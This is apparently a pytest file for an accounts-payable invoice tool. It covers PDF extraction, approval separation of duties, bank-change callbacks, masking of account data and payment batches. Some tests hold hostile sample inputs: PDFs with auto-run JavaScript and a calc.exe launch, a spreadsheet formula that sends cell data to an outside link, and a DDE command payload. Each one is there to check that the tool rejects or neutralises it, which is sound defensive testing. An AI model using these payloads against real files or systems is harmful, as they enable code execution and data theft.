import base64
import csv
import io
import json

import httpx
import pikepdf
import pytest
from reportlab.pdfgen import canvas
from sqlalchemy import select

from app.foundation import approvals, audit, files
from app.foundation.datacls import fingerprint_record, mask_record
from app.foundation.db import session_scope
from app.foundation.errors import Conflict, Forbidden, Invalid
from app.foundation.extraction import ExtractionLimitExceeded, PdfTextExtractor, get_extractor, set_extractor
from app.foundation.models import ApprovalRequest
from app.foundation.money import parse_cents
from app.foundation.settings import get_settings
from app.tools.ap import pdfgen, service
from app.tools.ap.models import BankChange, Invoice, PurchaseOrder, Vendor
from testing import principal

ACCT, ROUTING = "1234567890", "021000021"


@pytest.fixture
def vendor_po() -> tuple[int, str]:
    with session_scope() as db:
        v = Vendor(
            code="V1",
            name="Acme Supplies",
            phone_on_file="+1-555-0100",
            bank_name="First Synthetic Bank",
            bank_account=ACCT,
            bank_routing=ROUTING,
        )
        db.add(v)
        db.flush()
        db.add(PurchaseOrder(po_number="PO-1", vendor_id=v.id, amount_cents=5_000_000))
        return v.id, "PO-1"


def pdf(
    number: str = "INV-1",
    unit: int = 100_000,
    qty: int = 2,
    po: str | None = "PO-1",
    account: str = ACCT,
    **kw,
) -> bytes:
    return pdfgen.invoice_pdf(
        vendor="Acme Supplies",
        invoice_number=number,
        invoice_date="2026-10-01",
        due_date="2026-10-31",
        po_number=po,
        items=[("Consulting", qty, unit)],
        tax_cents=qty * unit // 10,
        bank_name="First Synthetic Bank",
        account=account,
        routing=ROUTING,
        **kw,
    )


def ingest(content: bytes, who: str = "cleo.clerk") -> int:
    with session_scope() as db:
        return service.ingest(db, principal(who), "invoice.pdf", content).id


def status(iid: int) -> str:
    with session_scope() as db:
        return service.get(db, iid).status


def test_extraction_reads_fields_with_confidence():
    ex = PdfTextExtractor().extract(pdf())
    f = {k: v.value for k, v in ex.fields.items()}
    assert (
        f["invoice_number"] == "INV-1"
        and f["total_cents" if False else "total"] == 220_000
        and f["remit_account"] == ACCT
    )
    assert not ex.warnings and not ex.low_confidence(0.9) and ex.line_items[0]["amount_cents"] == 200_000


def test_garbled_field_needs_verification_then_matches(vendor_po):
    iid = ingest(pdf(garble=["total"]))
    assert status(iid) == "needs_verification"
    with session_scope() as db:
        service.verify(db, principal("cleo.clerk"), iid, {"total_cents": 220_000}, "checked against PDF")
    assert status(iid) == "matched"


def test_every_verifier_is_excluded_from_approving(vendor_po):
    from dataclasses import replace

    from app.foundation.registry import get_registry

    roles = frozenset({"AP.Clerk", "AP.Approver"})
    dual = replace(principal("abe.approver"), roles=roles, permissions=get_registry().permissions_for(roles))
    iid = ingest(pdf(number="SOD1", garble=["invoice_date", "total"]))
    with session_scope() as db:
        service.verify(db, dual, iid, {"invoice_date": "2026-10-01"}, "checked date against PDF")
    assert status(iid) != "matched"
    with session_scope() as db:  # a later verifier must not clear the earlier one's exclusion
        service.verify(db, principal("cleo.clerk"), iid, {"total_cents": 220_000}, "checked total")
        service.submit(db, principal("cleo.clerk"), iid, "ready to pay")
        rid = service.get(db, iid).approval_request_id
        assert (
            dual.oid
            in approvals.Requirement.from_json(db.get(ApprovalRequest, rid).requirement).excluded_users
        )
    with session_scope() as db, pytest.raises(Forbidden):
        approvals.decide(db, dual, rid, "approve", "I set the date")
    with session_scope() as db:
        approvals.decide(db, principal("cam.controller"), rid, "approve", "independent check")
    assert status(iid) == "approved"


def test_duplicates_by_file_and_by_number(vendor_po):
    a = ingest(pdf())
    assert status(ingest(pdf())) == "duplicate"
    b = ingest(pdf(number="inv 0001", unit=100_001))  # normalises to the same number
    assert status(a) == "matched" and status(b) == "duplicate"


def test_po_and_vendor_exceptions(vendor_po):
    assert "po_not_found" in _issues(ingest(pdf(number="X1", po="PO-404")))
    assert "po_amount_exceeded" in _issues(ingest(pdf(number="X2", unit=3_000_000)))


def test_negative_amounts_are_exceptions_and_never_lower_po(vendor_po):
    iid = ingest(pdf(number="CR1", unit=-1_000_000, qty=1))
    assert status(iid) == "exception" and "negative_amount" in _issues(iid)
    with pytest.raises(Conflict), session_scope() as db:
        service.submit(db, principal("cleo.clerk"), iid, "credit note")
    ok = ingest(pdf(number="OK1"))
    with session_scope() as db, pytest.raises(Invalid):
        service.verify(db, principal("cleo.clerk"), iid, {"total_cents": -1}, "typo")
    with session_scope() as db:
        service.submit(db, principal("cleo.clerk"), ok, "ready to pay")
        rid = service.get(db, ok).approval_request_id
    with session_scope() as db:  # amount tampered after submit: approval must not lower invoiced_cents
        service.get(db, ok).total_cents = -1_000_000
    with pytest.raises(Conflict), session_scope() as db:
        approvals.decide(db, principal("abe.approver"), rid, "approve", "matches PO")
    with session_scope() as db:
        assert db.execute(select(PurchaseOrder)).scalar_one().invoiced_cents == 0


def _issues(iid: int) -> list[str]:
    with session_scope() as db:
        return service.get(db, iid).match["issues"]


def test_tiered_sequential_approval_and_separation(vendor_po):
    small = ingest(pdf(number="S1"))
    big = ingest(pdf(number="B1", unit=600_000))  # 1.32M cents incl tax >= 1M tier-2 threshold
    with session_scope() as db:
        service.submit(db, principal("cleo.clerk"), small, "ready to pay")
        service.submit(db, principal("cleo.clerk"), big, "ready to pay")
    with session_scope() as db:
        rid_small, rid_big = (
            service.get(db, small).approval_request_id,
            service.get(db, big).approval_request_id,
        )
    assert rid_small and rid_big
    with session_scope() as db:
        approvals.decide(db, principal("abe.approver"), rid_small, "approve", "matches PO")
    assert status(small) == "approved"
    with session_scope() as db:
        approvals.decide(db, principal("abe.approver"), rid_big, "approve", "matches PO")
    assert status(big) == "pending_approval"
    with session_scope() as db:  # replaying the same decision is idempotent and cannot satisfy stage 2
        approvals.decide(db, principal("abe.approver"), rid_big, "approve", "second time")
    assert status(big) == "pending_approval"
    with session_scope() as db:
        approvals.decide(db, principal("cam.controller"), rid_big, "approve", "controller ok")
    assert status(big) == "approved"
    with session_scope() as db:
        assert db.execute(select(PurchaseOrder)).scalar_one().invoiced_cents == 220_000 + 1_320_000


def test_bank_change_needs_callback_by_other_person_then_third_approver(vendor_po):
    vid, _ = vendor_po
    iid = ingest(pdf(number="BK1", account="9999999999"))
    assert "bank_details_differ" in _issues(iid)
    with session_scope() as db:
        bid = service.request_bank_change(
            db, principal("cleo.clerk"), vid, from_invoice=iid, reason="new details on invoice"
        ).id
    with session_scope() as db, pytest.raises(Forbidden):
        service.record_callback(db, principal("cleo.clerk"), bid, True, "called myself")
    with session_scope() as db:
        service.record_callback(
            db, principal("abe.approver"), bid, True, "Called +1-555-0100 on file; CFO confirmed change"
        )
        rid = db.get(BankChange, bid).approval_request_id
    assert rid
    with session_scope() as db, pytest.raises(Forbidden):
        approvals.decide(db, principal("abe.approver"), rid, "approve", "I did the call")
    with session_scope() as db:
        approvals.decide(db, principal("cam.controller"), rid, "approve", "verified evidence")
    with session_scope() as db:
        assert db.get(Vendor, vid).bank_account == "9999999999"
    assert status(iid) == "matched"


def test_batch_only_includes_approved_and_is_audited(vendor_po):
    iid = ingest(pdf(number="P1"))
    with session_scope() as db:
        service.submit(db, principal("cleo.clerk"), iid, "ready")
        rid = service.get(db, iid).approval_request_id
    with session_scope() as db:
        approvals.decide(db, principal("abe.approver"), rid, "approve", "ok to pay")
    with session_scope() as db:
        b = service.create_batch(db, principal("cam.controller"), "weekly run")
        assert b.count == 1 and "P1" in b.content and service.get(db, iid).status == "batched"
    with session_scope() as db, pytest.raises(Invalid):
        service.create_batch(db, principal("cam.controller"), "nothing left")


def raw_pdf(*bodies: bytes, trailer_extra: bytes = b"") -> bytes:
    """Hand-built PDF with a correct xref, so encodings the writer would normalise survive verbatim."""
    out = bytearray(b"%PDF-1.7\n")
    offsets = []
    for n, body in enumerate(bodies, start=1):
        offsets.append(len(out))
        out += b"%d 0 obj\n" % n + body + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(bodies) + 1)
    out += b"".join(b"%010d 00000 n \n" % o for o in offsets)
    out += b"trailer\n<< /Size %d /Root 1 0 R " % (len(bodies) + 1) + trailer_extra + b">>\n"
    out += b"startxref\n%d\n%%%%EOF\n" % xref
    return bytes(out)


PAGES = (
    b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
    b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Resources << >> >>",
)


def active(content: bytes) -> bool:
    try:
        files.validate(content)
    except Invalid as e:
        assert e.code in ("file_active_content", "file_malformed"), e.code
        return True
    return False


def test_file_validation():
    with pytest.raises(Invalid, match="type"):
        files.validate(b"MZ\x90\x00 not a pdf")
    with pytest.raises(Invalid, match="exceeds"):
        files.validate(b"%PDF-" + b"0" * files.MAX_BYTES)
    assert (
        files.sanitize_name("../../etc/passwd") == "passwd"
        and files.sanitize_name("in voice<>.pdf") == "in_voice_.pdf"
    )
    files.validate(pdf())  # our generated PDFs carry no active content
    files.validate(raw_pdf(b"<< /Type /Catalog /Pages 2 0 R >>", *PAGES))


def many_pages(n: int) -> bytes:
    buf = io.BytesIO()
    c = canvas.Canvas(buf)
    for i in range(n):
        c.drawString(72, 720, f"Page {i}")
        c.showPage()
    c.save()
    return buf.getvalue()


def test_extraction_rejects_too_many_pages():
    with pytest.raises(ExtractionLimitExceeded, match="more than 20 pages"):
        PdfTextExtractor().extract(many_pages(21))
    assert PdfTextExtractor().extract(many_pages(20)).fields["total"].value is None


def test_extraction_enforces_timeout_memory_and_char_limits():
    with pytest.raises(ExtractionLimitExceeded, match="longer than"):
        PdfTextExtractor(timeout_seconds=0.001).extract(pdf())
    with pytest.raises(ExtractionLimitExceeded):
        PdfTextExtractor(max_memory_bytes=32 * 1024 * 1024).extract(pdf())
    ex = PdfTextExtractor(max_chars=40).extract(pdf())
    assert "text layer truncated at 40 characters" in ex.warnings and ex.fields["total"].value is None


def test_ingest_rejects_pdf_over_limits(vendor_po):
    with pytest.raises(Invalid) as e:
        ingest(many_pages(21))
    assert e.value.code == "extract_limit"
    prev = get_extractor()
    set_extractor(PdfTextExtractor(timeout_seconds=0.001))
    try:
        with pytest.raises(Invalid) as e:
            ingest(pdf(number="SLOW"))
        assert e.value.code == "extract_limit"
    finally:
        set_extractor(prev)


@pytest.mark.parametrize(
    "catalog",
    [
        b"<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>",
        # name hex escapes decode to /OpenAction, /JavaScript, /JS
        b"<< /Type /Catalog /Pages 2 0 R /Open#41ction << /S /J#61vaScript /J#53 (app.alert(1)) >> >>",
        # NUL, comment and ')' delimiters the old byte regex did not accept
        b"<< /Type /Catalog /Pages 2 0 R /OpenAction\x00<< /S /Launch%c\n/F (calc.exe)>> >>",
        b"<< /Type /Catalog /Pages 2 0 R /Names << /JavaScript<< /Names [(a) << /S /JavaScript /JS(x)>>] >> >> >>",
        b"<< /Type /Catalog /Pages 2 0 R /Names << /Embedded#46iles << /Names [] >> >> >>",
        b"<< /Type /Catalog /Pages 2 0 R /AcroForm << /Fields [] /X#46A [] >> >>",
        b"<< /Type /Catalog /Pages 2 0 R /A#41 << /O << /S /SubmitForm >> >> >>",
    ],
)
def test_file_validation_rejects_active_content_encodings(catalog: bytes):
    with pytest.raises(Invalid, match="active") as e:
        files.validate(raw_pdf(catalog, *PAGES))
    assert e.value.code == "file_active_content"


def test_file_validation_rejects_active_content_in_object_streams():
    src = pikepdf.new()
    src.add_blank_page()
    src.Root.OpenAction = pikepdf.Dictionary(S=pikepdf.Name.JavaScript, JS=pikepdf.String("app.alert(1)"))
    buf = io.BytesIO()
    src.save(buf, object_stream_mode=pikepdf.ObjectStreamMode.generate, compress_streams=True)
    content = buf.getvalue()
    assert b"/OpenAction" not in content and b"/JavaScript" not in content  # hidden from a byte scan
    with pytest.raises(Invalid, match="active"):
        files.validate(content)


def test_file_validation_fails_closed_on_damaged_or_encrypted_pdf():
    # no xref: readers reconstruct it, so the parser repairs and we refuse rather than guess
    assert active(b"%PDF-1.4\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>")
    with pytest.raises(Invalid) as e:
        files.validate(b"%PDF-1.4\ngarbage")
    assert e.value.code == "file_malformed"
    src = pikepdf.new()
    src.add_blank_page()
    buf = io.BytesIO()
    src.save(buf, encryption=pikepdf.Encryption(owner="o", user=""))
    with pytest.raises(Invalid) as e:
        files.validate(buf.getvalue())
    assert e.value.code == "file_malformed"


def test_money_parse():
    assert parse_cents("1,234.5") == 123_450 and parse_cents("$7") == 700
    with pytest.raises(ValueError):
        parse_cents("1,2O4.00")


def test_api_masks_bank_details_and_permissions(login, vendor_po):
    c = login("cleo.clerk")
    r = c.post("/api/ap/invoices", files={"file": ("inv.pdf", pdf(number="API1"), "application/pdf")})
    assert r.status_code == 200, r.text
    assert r.json()["remit_account"] != ACCT and r.json()["status"] == "matched"
    assert (
        c.post("/api/ap/invoices", files={"file": ("x.exe", b"MZ\x90", "application/pdf")}).status_code == 422
    )
    assert login("abe.approver").post("/api/ap/batches", json={"reason": "not allowed"}).status_code == 403
    assert login("erin.engineer").get("/api/ap/invoices").status_code == 403
    assert c.get(f"/api/ap/invoices/{r.json()['id']}/file").content.startswith(b"%PDF")


def test_no_bank_detail_anywhere_in_invoice_json(login, vendor_po):
    c = login("cleo.clerk")
    iid = c.post(
        "/api/ap/invoices", files={"file": ("inv.pdf", pdf(number="LEAK1"), "application/pdf")}
    ).json()["id"]
    for body in (c.get("/api/ap/invoices?page_size=200").json(), c.get(f"/api/ap/invoices/{iid}").json()):
        dumped = json.dumps(body)
        assert ACCT not in dumped and ROUTING not in dumped
    ex = c.get(f"/api/ap/invoices/{iid}").json()["extraction"]
    conf = {f["field"]: f["confidence"] for f in ex["fields"]}
    assert "value" not in ex["fields"][0] and isinstance(conf["remit_account"], float)


def test_mask_record_masks_classified_keys_at_any_depth():
    rec = {
        "remit_account": ACCT,
        "nested": {"fields": {"remit_routing": {"value": ROUTING, "confidence": 0.98}}},
        "rows": [{"remit_account": ACCT, "memo": "ok"}],
    }
    masked = mask_record(service.RES, rec)
    assert ACCT not in json.dumps(masked) and ROUTING not in json.dumps(masked)
    assert masked["rows"][0]["memo"] == "ok" and masked["remit_account"] == "****" + ACCT[-4:]
    fp = fingerprint_record(service.RES, rec)
    assert ACCT not in json.dumps(fp) and ROUTING not in json.dumps(fp)


def test_inbox_poll(vendor_po):
    try:
        httpx.post(
            f"{get_settings().mocks_base_url}/ap-inbox/messages",
            json={
                "from": "ap@acme.example.com",
                "filename": "inbox.pdf",
                "content_b64": base64.b64encode(pdf(number="IN1")).decode(),
            },
            timeout=3,
        )
    except httpx.HTTPError:
        pytest.skip("mocks not running")
    with session_scope() as db:
        service.poll_inbox(db, {})
    with session_scope() as db:
        inv = db.execute(select(Invoice).where(Invoice.invoice_number == "IN1")).scalar_one()
        assert inv.source == "inbox" and inv.uploaded_by == "system:ap-inbox"
        assert audit.verify_chain(db, "ap").ok


def test_seed_runs():
    from app.tools.ap import seed

    with session_scope() as db:
        seed.seed(db, 0.2)
    with session_scope() as db:
        st = {s["status"] for s in service.stats(db)["by_status"]}
    assert "matched" in st


def test_resubmit_conflict(vendor_po):
    iid = ingest(pdf(number="R1"))
    with session_scope() as db:
        service.submit(db, principal("cleo.clerk"), iid, "ready")
    with session_scope() as db, pytest.raises(Conflict):
        service.submit(db, principal("cleo.clerk"), iid, "again")


FORMULA = '=HYPERLINK("https://x.example/?"&G2&H2,"open")'


def test_formula_invoice_number_needs_verification_and_cannot_be_verified(vendor_po):
    iid = ingest(pdf(number=FORMULA))
    assert status(iid) == "needs_verification"
    with session_scope() as db:
        assert service.get(db, iid).invoice_number == FORMULA
        with pytest.raises(Invalid, match="invoice_number"):
            service.verify(db, principal("cleo.clerk"), iid, {"invoice_number": "@SUM(1)"}, "typo")
    with session_scope() as db:
        service.verify(db, principal("cleo.clerk"), iid, {"total_cents": 220_000}, "checked totals only")
    assert status(iid) == "exception" and "invalid_invoice_number" in _issues(iid)
    with session_scope() as db:
        service.verify(db, principal("cleo.clerk"), iid, {"invoice_number": "INV-77"}, "from vendor call")
    assert status(iid) == "matched"


def test_batch_file_neutralizes_formula_cells(vendor_po):
    iid = ingest(pdf(number="F1"))
    with session_scope() as db:
        inv = service.get(db, iid)
        inv.invoice_number = FORMULA  # bypass validation: the file writer must still be safe
        db.get(Vendor, inv.vendor_id).name = "+cmd|' /C calc'!A0"
        service.submit(db, principal("cleo.clerk"), iid, "ready")
        rid = inv.approval_request_id
    with session_scope() as db:
        approvals.decide(db, principal("abe.approver"), rid, "approve", "ok to pay")
    with session_scope() as db:
        b = service.create_batch(db, principal("cam.controller"), "weekly run")
        row = next(csv.reader(io.StringIO(b.content.splitlines()[1])))
    assert row[1] == "'+cmd|' /C calc'!A0" and row[2] == "'" + FORMULA
